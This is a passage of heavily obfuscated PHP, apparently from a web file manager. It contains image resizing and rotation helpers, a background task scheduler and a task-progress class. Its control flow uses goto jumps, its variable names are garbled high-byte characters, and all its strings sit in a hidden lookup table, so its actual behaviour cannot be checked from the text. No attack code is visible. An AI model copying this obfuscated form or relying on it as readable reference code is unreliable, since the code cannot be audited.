$this->srcH); $E„Å³Ì»Ë = $this->creatImage($bÎ—–Ç‘, $b¤ØÎÇ…, $F£¬ß”äõ», 0, 0, ($f’‰ôšß¢Ë - $b¤ØÎÇ…) / 2, ($bÑ‹ƒ§Ô¹Æ - $F£¬ß”äõ») / 2, $b¤ØÎÇ…, $F£¬ß”äõ»); imageDestroy($bÎ—–Ç‘); goto F•¿‹©Úæã; BèŠôîÇ¦ë: $fÚ¿òêæ = $b¤ØÎÇ… / $F£¬ß”äõ»; $c’ä·¸Ú‰ = $this->srcW / $this->srcH; if ($fÚ¿òêæ <= $c’ä·¸Ú‰) { $bÑ‹ƒ§Ô¹Æ = $F£¬ß”äõ»; $f’‰ôšß¢Ë = $bÑ‹ƒ§Ô¹Æ * ($this->srcW / $this->srcH); } else { $f’‰ôšß¢Ë = $b¤ØÎÇ…; $bÑ‹ƒ§Ô¹Æ = $f’‰ôšß¢Ë * ($this->srcH / $this->srcW); } goto fáƒïÕó‘; F•¿‹©Úæã: return $this->echoImage($E„Å³Ì»Ë, $aù‘—±“»ã); goto b´ôŸŞ–‹â; b´ôŸŞ–‹â: } function backFill($EÊİÂÍ‚Ø’, $F‘ôğßÉËÄ, $a·¸¬öô›, $aÀ…¾¾Ğé‹ = false, $d‡‚²óÚÎ = 255, $CÙ…„ = 255, $Eë”óæË†‘ = 255) { goto f¿Ğ•ßåÒ; f¿Ğ•ßåÒ: $C¿‘¬»ãˆ  = $F‘ôğßÉËÄ / $a·¸¬öô›; $Eòõ† ¢„  = $this->srcW / $this->srcH; if ($C¿‘¬»ãˆ  <= $Eòõ† ¢„ ) { $AÅ²¿øïğ¨ = $F‘ôğßÉËÄ; $aœéÙØÍ²Ø = $AÅ²¿øïğ¨ * ($this->srcH / $this->srcW); } else { $aœéÙØÍ²Ø = $a·¸¬öô›; $AÅ²¿øïğ¨ = $aœéÙØÍ²Ø * ($this->srcW / $this->srcH); } goto Fò°çÙéÙ´; Fò°çÙéÙ´: if (function_exists($_SERVER[¹÷ˆ§éÒ°ú][1863])) { @($fãª®™‹©¤ = imageCreateTrueColor($F‘ôğßÉËÄ, $a·¸¬öô›)); if (!$fãª®™‹©¤) { $fãª®™‹©¤ = imageCreate($F‘ôğßÉËÄ, $a·¸¬öô›); } } else { $fãª®™‹©¤ = imageCreate($F‘ôğßÉËÄ, $a·¸¬öô›); } $B¿´´Ä¥Æ = ($a·¸¬öô› - $aœéÙØÍ²Ø) / 2; $fƒîçøÑğ§ = imagecolorallocate($fãª®™‹©¤, $d‡‚²óÚÎ, $CÙ…„, $Eë”óæË†‘); goto e¥ğ…‹¾à; dÙÛ¬¸©Š“: return $this->echoImage($fãª®™‹©¤, $EÊİÂÍ‚Ø’); goto f¨ÆèÄê§‹; e¥ğ…‹¾à: if ($aÀ…¾¾Ğé‹) { $fƒîçøÑğ§ = imageColorTransparent($fãª®™‹©¤, $fƒîçøÑğ§); $B¿´´Ä¥Æ = $a·¸¬öô› - $aœéÙØÍ²Ø; } imageFilledRectangle($fãª®™‹©¤, 0, 0, $F‘ôğßÉËÄ, $a·¸¬öô›, $fƒîçøÑğ§); if ($this->srcW > $F‘ôğßÉËÄ || $this->srcH > $a·¸¬öô›) { $A¤ùíè»Ø„ = $this->creatImage($this->im, $AÅ²¿øïğ¨, $aœéÙØÍ²Ø, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($AÅ²¿øïğ¨ < $F‘ôğßÉËÄ) { imageCopy($fãª®™‹©¤, $A¤ùíè»Ø„, ($F‘ôğßÉËÄ - $AÅ²¿øïğ¨) / 2, 0, 0, 0, $AÅ²¿øïğ¨, $aœéÙØÍ²Ø); } else { if ($aœéÙØÍ²Ø < $a·¸¬öô›) { imageCopy($fãª®™‹©¤, $A¤ùíè»Ø„, 0, $B¿´´Ä¥Æ, 0, 0, $AÅ²¿øïğ¨, $aœéÙØÍ²Ø); } else { imageCopy($fãª®™‹©¤, $A¤ùíè»Ø„, 0, 0, 0, 0, $AÅ²¿øïğ¨, $aœéÙØÍ²Ø); } } } else { imageCopyMerge($fãª®™‹©¤, $this->im, ($F‘ôğßÉËÄ - $AÅ²¿øïğ¨) / 2, $B¿´´Ä¥Æ, 0, 0, $AÅ²¿øïğ¨, $aœéÙØÍ²Ø, 100); } goto dÙÛ¬¸©Š“; f¨ÆèÄê§‹: } function creatImage($d„¬§§Ü«Œ, $Dææòâ„Ú², $fÃŞ¥ä™Ó, $b‘ÒãÁ‹Í­, $cá †˜À¸Š, $BµÔö‹‚ƒ, $Dº””–Ó÷—, $d‹™Ë¿è¦¬, $f·¬ÎöÃĞÇ) { if (function_exists($_SERVER[¹÷ˆ§éÒ°ú][1863])) { @($d£Ä·è³è = ImageCreateTrueColor($Dææòâ„Ú², $fÃŞ¥ä™Ó)); @imagealphablending($d£Ä·è³è, !1); @imagesavealpha($d£Ä·è³è, !0); if ($d£Ä·è³è) { imageCopyResampled($d£Ä·è³è, $d„¬§§Ü«Œ, $b‘ÒãÁ‹Í­, $cá †˜À¸Š, $BµÔö‹‚ƒ, $Dº””–Ó÷—, $Dææòâ„Ú², $fÃŞ¥ä™Ó, $d‹™Ë¿è¦¬, $f·¬ÎöÃĞÇ); } else { $d£Ä·è³è = ImageCreate($Dææòâ„Ú², $fÃŞ¥ä™Ó); imageCopyResized($d£Ä·è³è, $d„¬§§Ü«Œ, $b‘ÒãÁ‹Í­, $cá †˜À¸Š, $BµÔö‹‚ƒ, $Dº””–Ó÷—, $Dææòâ„Ú², $fÃŞ¥ä™Ó, $d‹™Ë¿è¦¬, $f·¬ÎöÃĞÇ); } } else { $d£Ä·è³è = ImageCreate($Dææòâ„Ú², $fÃŞ¥ä™Ó); imageCopyResized($d£Ä·è³è, $d„¬§§Ü«Œ, $b‘ÒãÁ‹Í­, $cá †˜À¸Š, $BµÔö‹‚ƒ, $Dº””–Ó÷—, $Dææòâ„Ú², $fÃŞ¥ä™Ó, $d‹™Ë¿è¦¬, $f·¬ÎöÃĞÇ); } return $d£Ä·è³è; } public function imgRotate($ašÊ¿ôô‚š, $f’Ó•ÒÌÆÎ) { goto cƒ…‰Šä¸è; cçÓöï´áå: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $FéÃÚîË = imagegif($FÆÊÒ·ëô«, $ašÊ¿ôô‚š); break; case IMAGETYPE_JPEG: $FéÃÚîË = imagejpeg($FÆÊÒ·ëô«, $ašÊ¿ôô‚š, 100); break; case IMAGETYPE_PNG: $FéÃÚîË = imagePNG($FÆÊÒ·ëô«, $ašÊ¿ôô‚š); break; default: break; } imageDestroy($FÆÊÒ·ëô«); imageDestroy($this->im); goto e¦ÚĞÂ„¸©; cƒ…‰Šä¸è: if (!$this->im || $f’Ó•ÒÌÆÎ % 360 === 0 || !function_exists($_SERVER[¹÷ˆ§éÒ°ú][1862])) { return !1; } $FÆÊÒ·ëô« = imageRotate($this->im, 360 - $f’Ó•ÒÌÆÎ, 0); $FéÃÚîË = !1; goto cçÓöï´áå; e¦ÚĞÂ„¸©: return $FéÃÚîË; goto bµëš¹¼”—; bµëš¹¼”—: } function echoImage($c÷œ–³ÏÀİ, $e†©˜¼µ¯Í) { goto dİ„”É†Šç; c†¯‹†Âõ : $e“ìäà¯¬® = !1; switch ($this->echoType) { case $C´§ô‘‘ğ[1864]: $e“ìäà¯¬® = imagePNG($c÷œ–³ÏÀİ); break; case $C´§ô‘‘ğ[179]: $e“ìäà¯¬® = imagePNG($c÷œ–³ÏÀİ, $e†©˜¼µ¯Í); break; } imageDestroy($c÷œ–³ÏÀİ); goto Bù§õ¤³ŒÁ; dİ„”É†Šç: $C´§ô‘‘ğ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$c÷œ–³ÏÀİ) { return !1; } ob_get_clean(); goto c†¯‹†Âõ ; Bù§õ¤³ŒÁ: imageDestroy($this->im); return $e“ìäà¯¬®; goto F‚‹µ£óœÉ; F‚‹µ£óœÉ: } } if (!function_exists($_SERVER[¹÷ˆ§éÒ°ú][1865])) { define($_SERVER[¹÷ˆ§éÒ°ú][1866], 0); define($_SERVER[¹÷ˆ§éÒ°ú][1867], 1); define($_SERVER[¹÷ˆ§éÒ°ú][1868], 2); function imageflip($c¯ĞÏé‹äò, $CùäÔã›øŠ) { switch ($CùäÔã›øŠ) { case IMG_FLIP_HORIZONTAL: $f–ÖŞƒºƒ = imagesx($c¯ĞÏé‹äò) - 1; $FÎæ´¾ï‰ë = $f–ÖŞƒºƒ / 2; $eÛ£Òèù›¶ = imagesy($c¯ĞÏé‹äò); $AÆò»´óˆÇ = imageistruecolor($c¯ĞÏé‹äò) ? imagecreatetruecolor(1, $eÛ£Òèù›¶) : imagecreate(1, $eÛ£Òèù›¶); for ($DùĞ¸ Šôà = 0; $DùĞ¸ Šôà < $FÎæ´¾ï‰ë; ++$DùĞ¸ Šôà) { imagecopy($AÆò»´óˆÇ, $c¯ĞÏé‹äò, 0, 0, $DùĞ¸ Šôà, 0, 1, $eÛ£Òèù›¶); imagecopy($c¯ĞÏé‹äò, $c¯ĞÏé‹äò, $DùĞ¸ Šôà, 0, $f–ÖŞƒºƒ - $DùĞ¸ Šôà, 0, 1, $eÛ£Òèù›¶); imagecopy($c¯ĞÏé‹äò, $AÆò»´óˆÇ, $f–ÖŞƒºƒ - $DùĞ¸ Šôà, 0, 0, 0, 1, $eÛ£Òèù›¶); } break; case IMG_FLIP_VERTICAL: $CêªÅ¤Ì‹ = imagesx($c¯ĞÏé‹äò); $CÖ¤ÎÌ‚Ÿæ = imagesy($c¯ĞÏé‹äò) - 1; $Cø•ß¬˜ØÍ = $CÖ¤ÎÌ‚Ÿæ / 2; $AÆò»´óˆÇ = imageistruecolor($c¯ĞÏé‹äò) ? imagecreatetruecolor($CêªÅ¤Ì‹, 1) : imagecreate($CêªÅ¤Ì‹, 1); for ($d¼é£åíä’ = 0; $d¼é£åíä’ < $Cø•ß¬˜ØÍ; ++$d¼é£åíä’) { imagecopy($AÆò»´óˆÇ, $c¯ĞÏé‹äò, 0, 0, 0, $d¼é£åíä’, $CêªÅ¤Ì‹, 1); imagecopy($c¯ĞÏé‹äò, $c¯ĞÏé‹äò, 0, $d¼é£åíä’, 0, $CÖ¤ÎÌ‚Ÿæ - $d¼é£åíä’, $CêªÅ¤Ì‹, 1); imagecopy($c¯ĞÏé‹äò, $AÆò»´óˆÇ, 0, $CÖ¤ÎÌ‚Ÿæ - $d¼é£åíä’, 0, 0, $CêªÅ¤Ì‹, 1); } break; case IMG_FLIP_BOTH: $CêªÅ¤Ì‹ = imagesx($c¯ĞÏé‹äò); $eÛ£Òèù›¶ = imagesy($c¯ĞÏé‹äò); $AÆò»´óˆÇ = imagerotate($c¯ĞÏé‹äò, 180, 0); imagecopy($c¯ĞÏé‹äò, $AÆò»´óˆÇ, 0, 0, 0, 0, $CêªÅ¤Ì‹, $eÛ£Òèù›¶); break; default: return; } imagedestroy($AÆò»´óˆÇ); } } if (!function_exists($_SERVER[¹÷ˆ§éÒ°ú][1869])) { function imagecreatefrombmp($e‡‡ØÈˆæÕ) { return ImageGdBMP::load($e‡‡ØÈˆæÕ); } } goto fòêã×¿˜ô; A‹Á–Ü÷¦ğ: class AutoTask { public static function start() { goto C•‡˜àµ°¶; fŸÖ…°¦¼: http_close(); self::valueSet($BäºŞÇâ‹[1391], $BäºŞÇâ‹[95]); Hook::bind($BäºŞÇâ‹[1393], $BäºŞÇâ‹[1394]); goto fùùÏØå†è; fùùÏØå†è: while (!0) { self::cacheClear(); if (self::valueGet($BäºŞÇâ‹[684]) != $BäºŞÇâ‹[95]) { self::valueSet($BäºŞÇâ‹[1391], $BäºŞÇâ‹[481]); self::log($BäºŞÇâ‹[1395]); die; } self::valueSet($BäºŞÇâ‹[1391], $BäºŞÇâ‹[95]); self::valueSet($BäºŞÇâ‹[1392], time()); self::taskRunAll(); sleep(self::valueGet($BäºŞÇâ‹[1396])); } goto aêôº²ìŞ–; C•‡˜àµ°¶: $BäºŞÇâ‹ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (self::valueGet($BäºŞÇâ‹[684]) != $BäºŞÇâ‹[95]) { return; } if (self::valueGet($BäºŞÇâ‹[1391]) == $BäºŞÇâ‹[95]) { $bÉ¡”÷¸®» = self::valueGet($BäºŞÇâ‹[1392]); if (time() - $bÉ¡”÷¸®» > 3600 * 2) { self::restart(); } return; } goto fŸÖ…°¦¼; aêôº²ìŞ–: } public static function restart() { $c×ñ›ß¶‚ =& $_SERVER[¹÷ˆ§éÒ°ú]; http_close(); self::valueSet($c×ñ›ß¶‚[684], $c×ñ›ß¶‚[481]); sleep(self::valueGet($c×ñ›ß¶‚[1396]) + 5); self::valueSet($c×ñ›ß¶‚[1391], $c×ñ›ß¶‚[481]); self::valueSet($c×ñ›ß¶‚[684], $c×ñ›ß¶‚[95]); } public static function shutdownEvent() { $eö²¢ß ë =& $_SERVER[¹÷ˆ§éÒ°ú]; self::valueSet($eö²¢ß ë[1391], $eö²¢ß ë[481]); self::log($eö²¢ß ë[1397]); } public static function config($a¥Õ×”¶ßÑ, $bæØ¬¼©é‚) { $D‚‘†°‚‘ =& $_SERVER[¹÷ˆ§éÒ°ú]; $B¡çœ‰××É = 20; $bæØ¬¼©é‚ = intval($bæØ¬¼©é‚) <= $B¡çœ‰××É ? $B¡çœ‰××É : intval($bæØ¬¼©é‚); self::valueSet($D‚‘†°‚‘[684], $a¥Õ×”¶ßÑ); self::valueSet($D‚‘†°‚‘[1396], $bæØ¬¼©é‚); } private static function taskRunAll() { $bğºšîò« =& $_SERVER[¹÷ˆ§éÒ°ú]; $b˜â¥‘Î½¥ = Model($bğºšîò«[1398])->listData(); $FÄÛºİÅà = count($b˜â¥‘Î½¥); for ($F¥»‘Û…—â = 0; $F¥»‘Û…—â < $FÄÛºİÅà; $F¥»‘Û…—â++) { $f¿–†ößÆ­ = $b˜â¥‘Î½¥[$F¥»‘Û…—â]; if ($f¿–†ößÆ­[$bğºšîò«[1399]] != $bğºšîò«[95]) { continue; } if (!self::taskTimeCheck($f¿–†ößÆ­)) { continue; } self::taskRun($f¿–†ößÆ­); } Hook::trigger($bğºšîò«[1400]); } private static function taskTimeCheck($d÷ÉŠ‚Ã¸¥) { goto Bƒ¬†º¯Ññ; a·‘ô„Ó¨°: $d„õê›¦‹— = strtotime($EÍ×æ¼ µ[1401] . $b¥Ô·àãÍ™[$EÍ×æ¼ µ[1402]] . $EÍ×æ¼ µ[1403]) - strtotime($EÍ×æ¼ µ[1404]); $EÁåìá„§ = time() - strtotime(date($EÍ×æ¼ µ[1405]) . $EÍ×æ¼ µ[1406]); $fš÷«˜˜†Ñ = $EÁåìá„§ >= $d„õê›¦‹— && $EÁåìá„§ <= $d„õê›¦‹— + 3600; goto eëŒ¨ÁòÕ; Bƒ¬†º¯Ññ: $EÍ×æ¼ µ =& $_SERVER[¹÷ˆ§éÒ°ú]; $b¥Ô·àãÍ™ = json_decode($d÷ÉŠ‚Ã¸¥[$EÍ×æ¼ µ[202]], !0); $DŞô÷Î¹Ô¢ = intval($d÷ÉŠ‚Ã¸¥[$EÍ×æ¼ µ[1392]]); goto a·‘ô„Ó¨°; eëŒ¨ÁòÕ: switch ($b¥Ô·àãÍ™[$EÍ×æ¼ µ[39]]) { case $EÍ×æ¼ µ[1407]: if (time() - $DŞô÷Î¹Ô¢ < 3600 * 24 * 30) { return !1; } if ($b¥Ô·àãÍ™[$EÍ×æ¼ µ[1407]] == date($EÍ×æ¼ µ[1408]) && $fš÷«˜˜†Ñ) { return !0; } break; case $EÍ×æ¼ µ[1409]: if (time() - $DŞô÷Î¹Ô¢ < 3600 * 24 * 7) { return !1; } $Eƒ‰ÃÛìÁ = date($EÍ×æ¼ µ[1410]) == 0 ? 7 : date($EÍ×æ¼ µ[1410]); if ($b¥Ô·àãÍ™[$EÍ×æ¼ µ[1409]] == $Eƒ‰ÃÛìÁ && $fš÷«˜˜†Ñ) { return !0; } break; case $EÍ×æ¼ µ[1402]: if (time() - $DŞô÷Î¹Ô¢ < 3600 * 24) { return !1; } if ($fš÷«˜˜†Ñ) { return !0; } break; case $EÍ×æ¼ µ[1411]: if (time() - $DŞô÷Î¹Ô¢ >= floatval($b¥Ô·àãÍ™[$EÍ×æ¼ µ[1411]]) * 60) { return !0; } break; default: break; } return !1; goto dí¯¢Š²‘Š; dí¯¢Š²‘Š: } public static function taskRun($dƒÑ–ÍÂ‹ù) { goto A±ÊÜ‹¼á™; B‚“ƒÙ‹¡: $b®š›¾‰‡ = timeFloat(); $Aî½Š¸İô« = $b ¦Ûœğ´[43]; switch ($dƒÑ–ÍÂ‹ù[$b ¦Ûœğ´[39]]) { case $b ¦Ûœğ´[306]: $D«¾ËËŸì = url_request($dƒÑ–ÍÂ‹ù[$b ¦Ûœğ´[1415]], $b ¦Ûœğ´[228], !1, !1, !1, !1, 5); $Aî½Š¸İô« = strlen($D«¾ËËŸì); break; case $b ¦Ûœğ´[227]: $Aî½Š¸İô« = Hook::apply($dƒÑ–ÍÂ‹ù[$b ¦Ûœğ´[1415]]); default: break; } goto AÊ‹¡×Ø“¿; AÊ‹¡×Ø“¿: Model($b ¦Ûœğ´[1416])->add(array($b ¦Ûœğ´[1417] => $b ¦Ûœğ´[43], $b ¦Ûœğ´[1418] => $b ¦Ûœğ´[481], $b ¦Ûœğ´[39] => $b ¦Ûœğ´[1419] . $dƒÑ–ÍÂ‹ù[$b ¦Ûœğ´[378]], $b ¦Ûœğ´[1420] => json_encode(array($b ¦Ûœğ´[38] => $dƒÑ–ÍÂ‹ù[$b ¦Ûœğ´[38]], $b ¦Ûœğ´[1421] => timeFloat() - $b®š›¾‰‡, $b ¦Ûœğ´[292] => $Aî½Š¸İô«)))); self::log($b ¦Ûœğ´[1422] . $dƒÑ–ÍÂ‹ù[$b ¦Ûœğ´[378]] . $b ¦Ûœğ´[1423] . $Aî½Š¸İô«); return !0; goto FâœÈÊŒĞ; A±ÊÜ‹¼á™: $b ¦Ûœğ´ =& $_SERVER[¹÷ˆ§éÒ°ú]; self::log($b ¦Ûœğ´[1412] . $dƒÑ–ÍÂ‹ù[$b ¦Ûœğ´[378]] . $b ¦Ûœğ´[1413] . $dƒÑ–ÍÂ‹ù[$b ¦Ûœğ´[38]] . $b ¦Ûœğ´[1414] . $dƒÑ–ÍÂ‹ù[$b ¦Ûœğ´[1415]]); Model($b ¦Ûœğ´[1398])->run($dƒÑ–ÍÂ‹ù[$b ¦Ûœğ´[378]]); goto B‚“ƒÙ‹¡; FâœÈÊŒĞ: } private static function valueGet($fîğæ‰Í½ƒ) { $BŠµõÃ–«„ =& $_SERVER[¹÷ˆ§éÒ°ú]; $FÁ…ÑÖ§¦Ì = $BŠµõÃ–«„[1424]; $b­„é¸‚ÌÊ = Model($BŠµõÃ–«„[1425])->get($fîğæ‰Í½ƒ, $FÁ…ÑÖ§¦Ì); if (is_null($b­„é¸‚ÌÊ)) { Model($BŠµõÃ–«„[1425])->set($BŠµõÃ–«„[1396], 10, $FÁ…ÑÖ§¦Ì); Model($BŠµõÃ–«„[1425])->set($BŠµõÃ–«„[684], $BŠµõÃ–«„[95], $FÁ…ÑÖ§¦Ì); Model($BŠµõÃ–«„[1425])->set($BŠµõÃ–«„[1391], $BŠµõÃ–«„[481], $FÁ…ÑÖ§¦Ì); $b­„é¸‚ÌÊ = Model($BŠµõÃ–«„[1425])->get($fîğæ‰Í½ƒ, $FÁ…ÑÖ§¦Ì); } return $b­„é¸‚ÌÊ; } private static function valueSet($EÄ¸‰ğõã, $Aö¢óÄ‰Â³) { $AÆ‚àÕŒ =& $_SERVER[¹÷ˆ§éÒ°ú]; return Model($AÆ‚àÕŒ[1425])->set($EÄ¸‰ğõã, $Aö¢óÄ‰Â³, $AÆ‚àÕŒ[1424]); } protected static function log($fÊœš™ ŞÄ) { write_log($fÊœš™ ŞÄ, $_SERVER[¹÷ˆ§éÒ°ú][1426]); } private static function cacheClear() { $D‚‰›ØöÃ =& $_SERVER[¹÷ˆ§éÒ°ú]; $C¹¶µ¦§ÓÈ = Model($D‚‰›ØöÃ[1425])->cacheKey($D‚‰›ØöÃ[1424]); Cache::clearMemory($C¹¶µ¦§ÓÈ); Model($D‚‰›ØöÃ[1398])->cacheClear(); } } class Task { const STATYS_STOP = "\x73\164\x6f\x70"; const STATYS_RUNNING = "\x72\x75\156\156\x69\156\x67"; const STATYS_KILL = "\153\151\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($C÷Î‚í÷ Ó, $AÉˆó²è§Ó = '', $dÉìˆÈ†ã¢ = 0, $bÇ™¾§˜»„ = '') { goto cªÁâ’Æ‚; b—œã‰Õ•»: Hook::trigger($C˜÷¦Ü³³‚[1438], $this->task); $this->task[$C˜÷¦Ü³³‚[1432]] = timeFloat(); goto bˆºˆ­Ãõî; cªÁâ’Æ‚: $C˜÷¦Ü³³‚ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (self::get($C÷Î‚í÷ Ó)) { return; } $this->task = array($C˜÷¦Ü³³‚[378] => $C÷Î‚í÷ Ó, $C˜÷¦Ü³³‚[1427] => USER_ID, $C˜÷¦Ü³³‚[1332] => $bÇ™¾§˜»„, $C˜÷¦Ü³³‚[39] => $AÉˆó²è§Ó, $C˜÷¦Ü³³‚[969] => $C˜÷¦Ü³³‚[43], $C˜÷¦Ü³³‚[967] => $dÉìˆÈ†ã¢, $C˜÷¦Ü³³‚[981] => 0, $C˜÷¦Ü³³‚[1428] => 0, $C˜÷¦Ü³³‚[1429] => 0, $C˜÷¦Ü³³‚[1430] => timeFloat(), $C˜÷¦Ü³³‚[1431] => 0, $C˜÷¦Ü³³‚[1432] => 0, $C˜÷¦Ü³³‚[1433] => 0, $C˜÷¦Ü³³‚[1434] => 0, $C˜÷¦Ü³³‚[684] => $C˜÷¦Ü³³‚[1391]); goto CáÑ‹‚°Ì; CáÑ‹‚°Ì: Hook::bind($C˜÷¦Ü³³‚[1393], array($this, $C˜÷¦Ü³³‚[1435])); Hook::bind($C˜÷¦Ü³³‚[1436], array($this, $C˜÷¦Ü³³‚[1437])); $this->startAfter(); goto b—œã‰Õ•»; bˆºˆ­Ãõî: } public function end() { goto fØÌµ»°›Î; fØÌµ»°›Î: $aŞáÒĞÎ¢‰ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$this->task) { return; } if ($this->task[$aŞáÒĞÎ¢‰[1432]]) { self::valueSet($this->task[$aŞáÒĞÎ¢‰[378]], !1); } goto a†ğâŞ¦ï§; a†ğâŞ¦ï§: $dëã ƒŠô¸ = timeFloat() - $this->task[$aŞáÒĞÎ¢‰[1430]]; self::log($aŞáÒĞÎ¢‰[1439] . $this->task[$aŞáÒĞÎ¢‰[378]] . $aŞáÒĞÎ¢‰[1440] . $dëã ƒŠô¸ . $aŞáÒĞÎ¢‰[1441]); Hook::unbind($aŞáÒĞÎ¢‰[1393], array($this, $aŞáÒĞÎ¢‰[1435])); goto AŸÔî¿‰È; AŸÔî¿‰È: Hook::unbind($aŞáÒĞÎ¢‰[1436], array($this, $aŞáÒĞÎ¢‰[1437])); $this->endAfter(); $this->task = !1; goto Fà´İõØç•; Fà´İõØç•: } public function update($A†í¢¼Ğ° = 0) { goto dÛ…ö©¦¥É; dÛ…ö©¦¥É: $Fë£˜¨‹ß› =& $_SERVER[¹÷ˆ§éÒ°ú]; $e™ñìÁĞ¤ =& $this->task; if (!$e™ñìÁĞ¤) { return; } goto dóÒ»Ò¡‡; Bíì¼éË‚Ï: $e™ñìÁĞ¤[$Fë£˜¨‹ß›[684]] = $AÈ×ê àÔÉ ? $AÈ×ê àÔÉ : $e™ñìÁĞ¤[$Fë£˜¨‹ß›[684]]; $e™ñìÁĞ¤[$Fë£˜¨‹ß›[1433]] = $Ašõß¾©ñß[$Fë£˜¨‹ß›[1433]] ? $Ašõß¾©ñß[$Fë£˜¨‹ß›[1433]] : 0; $e™ñìÁĞ¤[$Fë£˜¨‹ß›[1432]] = timeFloat(); goto C‘Åùğ°®İ; eˆäàºù¡: $this->updateAfter(); $EÌª£Ç´´ = 0.2; if (timeFloat() - $e™ñìÁĞ¤[$Fë£˜¨‹ß›[1432]] < $EÌª£Ç´´) { return; } goto aèùê‰¶Ñ; C‘Åùğ°®İ: Hook::trigger($Fë£˜¨‹ß›[1445], $e™ñìÁĞ¤); self::valueSet($e™ñìÁĞ¤[$Fë£˜¨‹ß›[378]], $e™ñìÁĞ¤); goto bÛµï•Â·ã; aèùê‰¶Ñ: $Ašõß¾©ñß = self::get($e™ñìÁĞ¤[$Fë£˜¨‹ß›[378]]); $AÈ×ê àÔÉ = $Ašõß¾©ñß[$Fë£˜¨‹ß›[684]]; if ($AÈ×ê àÔÉ == self::STATYS_KILL) { $eÇç§áŸˆê = array($Fë£˜¨‹ß›[1442] => LNG($Fë£˜¨‹ß›[1443]), $Fë£˜¨‹ß›[1023] => !1); Cache::set($Fë£˜¨‹ß›[1444] . $this->task[$Fë£˜¨‹ß›[378]], $eÇç§áŸˆê, 30); $this->end(); die; } else { if ($AÈ×ê àÔÉ == self::STATYS_STOP) { $EŠ«ÆŸœÓ¾ = 2; $Ašõß¾©ñß[$Fë£˜¨‹ß›[1433]] += $EŠ«ÆŸœÓ¾; self::valueSet($e™ñìÁĞ¤[$Fë£˜¨‹ß›[378]], $Ašõß¾©ñß); sleep($EŠ«ÆŸœÓ¾); $this->update(); return; } } goto Bíì¼éË‚Ï; dóÒ»Ò¡‡: $e™ñìÁĞ¤[$Fë£˜¨‹ß›[981]] += $A†í¢¼Ğ°; $e™ñìÁĞ¤[$Fë£˜¨‹ß›[1431]] = timeFloat(); if ($e™ñìÁĞ¤[$Fë£˜¨‹ß›[967]]) { if ($e™ñìÁĞ¤[$Fë£˜¨‹ß›[967]] < $e™ñìÁĞ¤[$Fë£˜¨‹ß›[981]]) { $e™ñìÁĞ¤[$Fë£˜¨‹ß›[967]] = $e™ñìÁĞ¤[$Fë£˜¨‹ß›[981]]; } $e™Œ¡½°ÛĞ = timeFloat() - $e™ñìÁĞ¤[$Fë£˜¨‹ß›[1430]] - $e™ñìÁĞ¤[$Fë£˜¨‹ß›[1433]]; $e™ñìÁĞ¤[$Fë£˜¨‹ß›[1428]] = $e™ñìÁĞ¤[$Fë£˜¨‹ß›[981]] / $e™ñìÁĞ¤[$Fë£˜¨‹ß›[967]]; $e™ñìÁĞ¤[$Fë£˜¨‹ß›[1429]] = $e™ñìÁĞ¤[$Fë£˜¨‹ß›[981]] / $e™Œ¡½°ÛĞ; if ($e™ñìÁĞ¤[$Fë£˜¨‹ß›[1428]] > 0) { $e™ñìÁĞ¤[$Fë£˜¨‹ß›[1434]] = $e™Œ¡½°ÛĞ * (1 - $e™ñìÁĞ¤[$Fë£˜¨‹ß›[1428]]) / $e™ñìÁĞ¤[$Fë£˜¨‹ß›[1428]]; } $e™ñìÁĞ¤[$Fë£˜¨‹ß›[1434]] = $e™ñìÁĞ¤[$Fë£˜¨‹ß›[1434]] <= 0 ? 0 : $e™ñìÁĞ¤[$Fë£˜¨‹ß›[1434]]; } goto eˆäàºù¡; bÛµï•Â·ã: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($fè†Œ¤ÌÖ¤) { $Fø¦ã°³£Ï =& $_SERVER[¹÷ˆ§éÒ°ú]; Cache::set($Fø¦ã°³£Ï[1444] . $this->task[$Fø¦ã°³£Ï[378]], $fè†Œ¤ÌÖ¤, 60); return $fè†Œ¤ÌÖ¤; } public static function get($fÈŸÓ¢øò¡) { return self::valueGet($fÈŸÓ¢øò¡); } public static function listData() { $c—ùöº›˜« = self::valueGet(); return array_sort_by($c—ùöº›˜«, $_SERVER[¹÷ˆ§éÒ°ú][1430], !0); } public static function kill($f¶³å¢Ô) { return self::changeStatus($f¶³å¢Ô, self::STATYS_KILL); } public static function stop($DàÕ’¤é·ï) { return self::changeStatus($DàÕ’¤é·ï, self::STATYS_STOP); } public static function restart($BÑÛ†‘à­Ö) { return self::changeStatus($BÑÛ†‘à­Ö, self::STATYS_RUNNING); } public static function killAll() { $EëƒåÅÏ” =& $_SERVER[¹÷ˆ§éÒ°ú]; $DÃ×¿ –ê¯ = self::listData(); foreach ($DÃ×¿ –ê¯ as $Eé‚ŒÓÌ«) { self::kill($Eé‚ŒÓÌ«[$EëƒåÅÏ”[378]]); } sleep(2); foreach ($DÃ×¿ –ê¯ as $Eé‚ŒÓÌ«) { self::valueSet($Eé‚ŒÓÌ«[$EëƒåÅÏ”[378]], !1); } } private static function changeStatus($F“¹é»Ó¸ù, $BÀ¹İ‚¶¤è) { goto eîÌÉ®Şì¨; a¡‚Ş×‘ÑÑ: $f©é”ğËì[$F ÆĞßğ‹·[684]] = $BÀ¹İ‚¶¤è; self::valueSet($F“¹é»Ó¸ù, $f©é”ğËì); self::log($F ÆĞßğ‹·[1446] . $f©é”ğËì[$F ÆĞßğ‹·[378]] . $F ÆĞßğ‹·[1447] . $BÀ¹İ‚¶¤è); goto B»’¹éÉ›; eîÌÉ®Şì¨: $F ÆĞßğ‹· =& $_SERVER[¹÷ˆ§éÒ°ú]; $f©é”ğËì = self::valueGet($F“¹é»Ó¸ù); if (!$f©é”ğËì) { return !1; } goto a¡‚Ş×‘ÑÑ; B»’¹éÉ›: return !0; goto D²·ñ‹¿è¶; D²·ñ‹¿è¶: } public static function valueGet($CÇĞ‘É»Ä = false) { $Eë‰ß©“…® =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($CÇĞ‘É»Ä) { $câ¶Šš¡’ = Model($Eë‰ß©“…®[410])->where(array($Eë‰ß©“…®[101] => $CÇĞ‘É»Ä, $Eë‰ß©“…®[39] => 